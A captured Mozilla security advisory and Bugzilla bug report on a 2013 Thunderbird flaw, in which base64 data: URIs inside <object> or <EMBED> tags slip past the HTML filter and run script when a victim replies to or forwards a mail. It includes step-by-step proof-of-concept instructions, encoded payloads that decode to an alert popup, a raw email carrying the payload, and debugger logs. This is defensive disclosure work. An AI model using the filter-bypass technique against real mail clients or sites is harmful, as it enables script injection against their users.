=== Content from www.mozilla.org_e6c2620a_20250124_194459.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2014-14

## Script execution in HTML mail replies

Announced
February 6, 2014
Reporter
Fabián Cuchietti, Ateeq ur Rehman Khan
Impact
High
Products
SeaMonkey, Thunderbird
Fixed in

* SeaMonkey 2.20
* Thunderbird 23

### Description

Security researcher **Fabián Cuchietti** discovered that
it was possible to bypass the restriction on JavaScript execution in mail by
embedding an <iframe> with a data: URL within a message. If the victim
replied or forwarded the mail after receiving it, quoting it "in-line"
using Thunderbird's HTML mail editor, it would run the attached script. The
running script would be restricted to the mail composition window where it could
observe and potentially modify the content of the mail before it was sent.
Scripts were not executed if the recipient merely viewed the mail, only if it
was edited as HTML. Turning off HTML composition prevented the vulnerability and
forwarding the mail "as attachment" prevented the forwarding
variant.

**Ateeq ur Rehman Khan** of Vulnerability Labs reported
additional variants of this attack involving the use of the <object> tag
and which could be used to attach object data types such as images, audio, or
video.

This affected the Thunderbird 17 branch. It was fixed in all
versions based on Gecko 23 or later. Thunderbird 24 and later are not affected
by this vulnerability.

### References

* [HTML mail compose self-XSS due to signature text](https://bugzilla.mozilla.org/show_bug.cgi?id=868267)
* [HTML compose window XSS via <object> tag on Reply/Forward
  ("wiretap" is back)](https://bugzilla.mozilla.org/show_bug.cgi?id=875818)
* [CVE-2013-6674](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6674)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.2/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_6ee5f844_20250124_194501.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/875818)
* [XML](/show_bug.cgi?ctype=xml&id=875818)

Closed
[Bug 875818](/show_bug.cgi?id=875818)
(wiretap)

Opened 12 years ago
Closed 11 years ago

# HTML compose window XSS via <object> tag on Reply/Forward ("wiretap" is back)

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

HTML compose window XSS via <object> tag on Reply/Forward ("wiretap" is back)

## Categories

### (MailNews Core :: Composition, defect)

[Product:](/describecomponents.cgi?product=MailNews%20Core)

MailNews Core
▾

MailNews Core
Mail and news components common to Thunderbird and SeaMonkey
[See Open Bugs in This Product](/buglist.cgi?product=MailNews%20Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=MailNews%20Core)
Watch This Product

[Component:](/describecomponents.cgi?product=MailNews%20Core&component=Composition#Composition)

Composition
▾

MailNews Core :: Composition
Problems with the writing a new email or replying to one including using the autocomplete feature. Generally, problems found are within the compose window before sending a message. A few examples: 1. User interface and functionality problems with the html compose window and the plain text compose
window. 2. Problems with addressing a mail message or adding an attachment.
[See Open Bugs in This Component](/buglist.cgi?product=MailNews%20Core&component=Composition&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=MailNews%20Core&component=Composition&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=MailNews%20Core&component=Composition)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

x86

macOS

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

## Tracking

### (thunderbird23 unaffected, thunderbird24- unaffected, thunderbird25 unaffected, thunderbird-esr17 wontfix)

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

---

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| thunderbird23 | --- | [unaffected](/buglist.cgi?f1=cf_status_thunderbird23&o1=equals&v1=unaffected) |
| thunderbird24 | [-](/buglist.cgi?f1=cf_tracking_thunderbird24&o1=equals&v1=-) | [unaffected](/buglist.cgi?f1=cf_status_thunderbird24&o1=equals&v1=unaffected) |
| thunderbird25 | --- | [unaffected](/buglist.cgi?f1=cf_status_thunderbird25&o1=equals&v1=unaffected) |
| thunderbird-esr17 | --- | [wontfix](/buglist.cgi?f1=cf_status_thunderbird_esr17&o1=equals&v1=wontfix) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| relnote-thunderbird |  | --- |
| thunderbird23 |  | unaffected |
| thunderbird24 | - | unaffected |
| thunderbird25 |  | unaffected |
| thunderbird-esr17 |  | wontfix |
| seamonkey2.53 | --- | --- |
| seamonkey2.57esr | --- | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| thunderbird133 | --- | --- |
| thunderbird134 | --- | --- |
| thunderbird135 | --- | --- |
| thunderbird136 | --- | --- |

## People

### (Reporter: abillings, Unassigned)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

*Unassigned*

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=40)  [abillings](/user_profile?user_id=280903)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

---

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

15 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[CVE-2013-6674](/show_bug.cgi?id=868267 "RESOLVED FIXED - HTML mail compose self-XSS due to signature text"), [897639](/show_bug.cgi?id=897639 "RESOLVED DUPLICATE - self-xss in thunderbird :: new mail filter")

Dependency [tree](/showdependencytree.cgi?id=875818&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=875818)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[Duplicates:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates)

[881686](/show_bug.cgi?id=881686 "RESOLVED DUPLICATE - Filter Bypass & Persistent Vulnerabilities"), [881691](/show_bug.cgi?id=881691 "RESOLVED DUPLICATE - Persistent EML Web Vulnerability"), [897639](/show_bug.cgi?id=897639 "RESOLVED DUPLICATE - self-xss in thunderbird :: new mail filter"), [900547](/show_bug.cgi?id=900547 "RESOLVED DUPLICATE - XSS via iframe in Thunderbird"), [900768](/show_bug.cgi?id=900768 "RESOLVED DUPLICATE - XSS in Thunderbird")

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: reporter-external, sec-high, Whiteboard: [CVE-2013-6674 in bug 868267])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

wiretap

[Keywords:](/describekeywords.cgi)

[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[CVE-2013-6674 in bug 868267]

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#c10 "12 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | wanted-thunderbird |  |
| --- | --- | --- |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | relnote |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (3 files)

| [Image of PoC functioning](/attachment.cgi?id=753844)  [12 years ago](#c1)  [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)   159.57 KB, image/png |  | [Details](/attachment.cgi?id=753844&action=edit) |
| --- | --- | --- |
| [Thunderbird error console during PoC](/attachment.cgi?id=753845)  [12 years ago](#c2)  [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)   150.76 KB, image/png |  | [Details](/attachment.cgi?id=753845&action=edit) |
| [Image of debugger raw logs during PoC](/attachment.cgi?id=753846)  [12 years ago](#c3)  [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)   222.24 KB, image/png |  | [Details](/attachment.cgi?id=753846&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=875818#c0)• 12 years ago |
|  | |

Title:
======
Mozilla Thunderbird - 17.0.6 - Base URI Filter Bypass & Persistent Script Code Injection Vulnerability
Date:
=====
2013-05-21
References:
===========
<http://www.vulnerability-lab.com/get_content.php?id=953>
VL-ID:
=====
953
Common Vulnerability Scoring System:
====================================
3.9
Introduction:
=============
Thunderbird is a free, open-source, cross-platform application for managing email and news feeds. It is a local (rather than a web-based) email application that is powerful yet easy-to-use. Thunderbird has lots of cool features. Thunderbird gives you control and ownership over your email. There are lots of add-ons available for Thunderbird that enable you to extend and customize your email experience. Thunderbird is part of the Mozilla Manifesto, a pledge that describes Mozilla`s commitment to an open, accessible, egalitarian Internet.
Vendor Homepage: <http://www.mozilla.org>
Product website: <http://www.mozilla.org/en-US/thunderbird/>
Abstract:
=========
An independent vulnerability lab researcher discovered a filter bypass and persistent validation vulnerability in the Mozilla Thunderbird Email Software.
Report-Timeline:
================
2013-05-10: Researcher Notification & Coordination (Ateeq Khan)
2013-05-11: Vendor Notification (Mozilla - Security Incident Team)
2013-00-00: Vendor Response/Feedback (Mozilla - Security Incident Team)
2013-00-00: Vendor Fix/Patch (Mozilla - Developer Team)
2013-00-00: Public Disclosure (Vulnerability Laboratory)
Status:
========
Unpublished
Affected Products:
==================
Mozilla
Product: Thunderbird - EMail Application 17.0.6
Exploitation-Technique:
=======================
Remote
Severity:
=========
Medium
Details:
========
It has been discovered that the security controls / filters currently being used in Mozilla Thunderbird application can be easily evaded if an attacker decides to encrypt the payloads with base64 encryption and combine it with the <object> tag. During the testing, it was initially noticed that malicious javascript tags were being filtered / blocked in the Thunderbird application however, Attaching a debugger with the Thunderbird .exe file revealed some very interesting information and gave much better insight behind the actual working of the application. Most of the information revealed is Javascript errors which gave the researcher much hope in believing that the application might actually be vulnerable.
By default, HTML tags like <script> and <iframe> are blocked in Thunderbird and get filtered immediately upon insertion however, While drafting a new email message, attackers can easily bypass the current input filters by encoding their payloads with base64 encryption and using the <object> tag and insert malicious scripts / code eg. (script / frame) within the emails and send it to the victims. The exploit gets triggered once the victim decides to reply back and clicks on the \'Reply\' or \'Forward\' Buttons.
After successfully bypassing the input filters, an attacker can inject persistent script code while writing a new email and send it to victims. Interestingly the payload gets filtered during the initial viewing mode however if the victim clicks on Reply or Forward, the exploit gets executed successfully. For a POC i will be including multiple examples in this advisory for your review. I was able to run multiple scripts generating strange behaviour on the application which can be seen in the debugging errors which I have attached along with this report.
These sort of vulnerabilities can result in multiple attack vectors on the client end which may eventually result in complete compromise of the end user system. The persistent code injection vulnerability is located within the main application.
Exploitation of this persistent application vulnerability requires a low or medium user interaction. Successful exploitation of the vulnerability may result in malicious script code being executed in the victims browser resulting in script code injection, persistent phishing, Client side redirects and similar client side attacks.
Vulnerable Service(s):
[+] Mozilla Thunderbird 17.0.6 - Latest Release
Vulnerable Section(s):
[+] Write (Create a new message)
[+] Email Signature (Account Settings)
[+] Attach File with Signature as HTML (Account Settings)
Proof of Concept:
=================
For successful exploitation of this bug, the attacker needs follow the following steps:
a) Create a new email message
b) In the body text, insert new HTML tag with the POC "Payload"
c) Send the email to the victim
d) Open the new email in the victim browser and click Reply
e) You should now see a Javascript Application popup window proving the existence of this vulnerability.
Proof of Concept #2
-------------------
a) Goto Tools and then Account Settings
b) Under the Signature Text, insert the Payload and enable 'Use HTML'
c) Close the menu and Click on "Write" to create a new email
d) You should get a popup the moment new Email editor window opens up proving the existence of this vulnerability.
Proof of Concept #3
-------------------
a) Create a new text file on your desktop (local computer) and insert the POC payload in it and save it as test.html (HTML)
b) Goto Tools and then Account Settings
c) Below the Signature Text box, enable 'Attach the signature from a file instead'
d) Click Choose and select the 'test.html' file which you created in step a.
e) Click on Write and you should be able to see the Javascript popup proving the existence of this vulnerability.
Payload #1
----------
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiTW96aWxsYS1UaHVuZGVyYmlyZC1TY3JpcHQtQ29kZS1JbmplY3Rpb24t
UE9DLUF0ZWVxLUtoYW4iKTs8L3NjcmlwdD4=
"></object>
Payload #2
----------
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDov
L3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5
L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw
IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIk1vemlsbGEt
VGh1bmRlcmJpcmQtU2NyaXB0LUNvZGUtSW5qZWN0aW9uLVBPQy1BdGVlcS1LaGFuIik7PC9zY3Jp
cHQ+PC9zdmc+" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
1.3
POC Technical Description:
--------------------------
Here, we used the data URI payload as a value assigned to the ëdataí attribute of the ëobjectí tag. The <object> tag is used to include objects such as images, audio, videos, Java applets, ActiveX, PDF, and Flash. The ëdataí attribute of the object tag defines a URL that refers to the object's data. Data in the "data:" URI is encoded as a base64 string:
Base64-encoded payload: PHNjcmlwdD5hbGVydCgiTW96aWxsYS1UaHVuZGVyYmlyZC1TY3JpcHQtQ29kZS1JbmplY3Rpb24tUE9DLUF0ZWVxLUtoYW4iKTs8L3NjcmlwdD4=
Base64-decoded payload: <script>alert("Mozilla-Thunderbird-Script-Code-Injection-POC-Ateeq-Khan");</script>
When the browser loads the object tag, it loads an object (in our case, itís a javascript) assigned to its data attribute. This causes execution of our javascript. We were able to bypass the application blacklist filter because of the base64-encoded payload.
1.4
Email Header showing the hidden malicious payload
-------------------------------------------------
Message-ID: <5195AABB.9000409@ccure.it>
Date: Fri, 17 May 2013 08:57:47 +0500
From: Ateeq Khan <ateeq@ccure.it>
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/20130509 Thunderbird/17.0.6
MIME-Version: 1.0
To: ateeq <ateeq@ccure.it>
Subject: Test
X-Enigmail-Version: 1.5.1
Content-Type: multipart/alternative;
boundary="------------070707070308040102070208"
X-Provags-ID: V02:K0:x1sxyB72JjArK0t7OpMGlUdnbY0vjneQvJdkX/twIfw
QgzRaY5JN/SeFJ/fl2yULg+LJCKojYYGFR/8wrcS9hv6B6WWrN
mur6d1IsxEn2D2kZt5fQ3tk8Z1qDiEpN5C7vrtOyEFAMJR3NHg
jsL6elL9oxDkDRj1rYWvipndH1vonoPT3kjbcmuPsEZwYZ0JkL
BjvA5CQE3qDMPgd5nzdT8SqKBRrj9u7m/irxCWHeJcnAG0XBnK
txadh05EhpYjzrsz2kd+EyQe8ABh9F+yHQs6PBgIJeMDhm3EmY
KPDb5TDHAsnDSD7e3jSaj1t/jhHWc4OA+Okkw+PsyBasdNvzw=
=
X-UI-Junk: AutoNotJunk -999 (UWL);
V01:9SSPrMSv:3OJduITnBKJW2sO9FDRIJW8REKQH86F2DhxLUWcUUFzS1g0JhJ7
GgRkniiwfqYstxpjhSj957gz/8tEx07A4XeXZriK0TD0WhS1DXezTz/TtZsDYDEh
hoWYOFl3bb5yC2QDLQsFZpUW8W11Q1ueL83Jxhvv1UmeH1zGnYFLHhAFOpzxH4jN
652vXWc8dXjmX/WjTrvcI6NDjWdTTTfnDoO2PVFxLR+Tspu5HEv+SDuyrKv18Pei
ogK+aeYsHnGw+Sv4tyfEE3I/nLbDefudGihBnld6s0loLxOOAGeIYxOeZ4Je+v0h
MH9Y6ICIP7qvG/CkWt1PYQDzeNRPMANzlOgD/c//0kMjpKd6GwFWZIgfLyEFGGGA
5ghpw5skyHXrAcf+FBq4ayJpL2UIfGeghWw==
X-Nemesis-Spam: whitelist
Envelope-To: ateeq@ccure.it
This is a multi-part message in MIME format.
--------------070707070308040102070208
Content-Type: text/plain; charset=ISO-8859-1
Content-Transfer-Encoding: 7bit
--
--------------070707070308040102070208
Content-Type: text/html; charset=ISO-8859-1
Content-Transfer-Encoding: 7bit
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
</head>
<body text="#000000" bgcolor="#FFFFFF">
<object
data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiTW96aWxsYS1UaHVuZGVyYmlyZC1TY3JpcHQtQ29kZS1JbmplY3Rpb24tUE9DLUF0ZWVxLUtoYW4iKTs8L3NjcmlwdD4=
"></object>
<div class="moz-signature">-- <br>
<script>alert(1)</script></div>
</body>
</html>
--------------070707070308040102070208--
1.5
Interesting Raw Application Logs captured during the entire process of testing:
-------------------------------------------------------------------------------
(4fbc.3828): Break instruction exception - code 80000003 (first chance)
eax=fff82000 ebx=00000000 ecx=00000000 edx=7792f85a esi=00000000 edi=00000000
eip=778a000c esp=0ffffd94 ebp=0ffffdc0 iopl=0 nv up ei pl zr na pe nc
cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246
ntdll!DbgBreakPoint:
778a000c cc int 3
0:040> g
[JavaScript Error: "Search service falling back to synchronous initialization at SRCH\_SVC\_\_ensureInitialized@resource:///components/nsSearchService.js:2498
@resource:///components/nsSearchService.js:3476
\_adjustAcItem@chrome://messenger/content/webSearch.xml:42
@chrome://messenger/content/webSearch.xml:22
" {file: "resource:///components/nsSearchService.js" line: 2499}]
[JavaScript Error: "2013-05-18 06:02:42 gloda.datastore ERROR Async queryFromQuery error: 1: malformed MATCH expression:
["<EMBED" "SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDov,L3d3dy53My5vcmcvMjA
wMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5"]
" {file: "resource:///modules/gloda/log4moz.js" line: 687}]
2013-05-18 06:02:42 gloda.datastore ERROR Async queryFromQuery error: 1: malformed MATCH expression:
["<EMBED" "SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDov,L3d3dy53My5vcmcvMjA
wMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5"]
[JavaScript Error: "2013-05-18 06:02:42 gloda.datastore ERROR Async queryFromQuery error: 1: malformed MATCH expression:
["<EMBED" "SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDov,L3d3dy53My5vcmcvMjA
wMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5"]
" {file: "resource:///modules/gloda/log4moz.js" line: 687}]
2013-05-18 06:02:42 gloda.datastore ERROR Async queryFromQuery error: 1: malformed MATCH expression:
["<EMBED" "SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDov,L3d3dy53My5vcmcvMjA
wMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5"]
[JavaScript Error: "An error occurred executing the cmd\_insertHTMLWithDialog command: [Exception...
"Could not convert Native argument arg 3 [nsIDOMJSWindow.openDialog]" nsresult: "0x8057000a (NS\_ERROR\_XPC\_BAD\_CONVERT\_NATIVE)"
location: "JS frame :: chrome://editor/content/ComposerCommands.js :: <TOP\_LEVEL> :: line 2790" data: no]"
{file: "chrome://global/content/globalOverlay.js" line: 95}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
{file: "chrome://messenger/content/messengercompose/messengercompose.xul" line: 0}]
[JavaScript Warning: "XUL box for \_moz\_generated\_content\_before element contained an inline #text child, forcing all its children to be wrapped in a block."
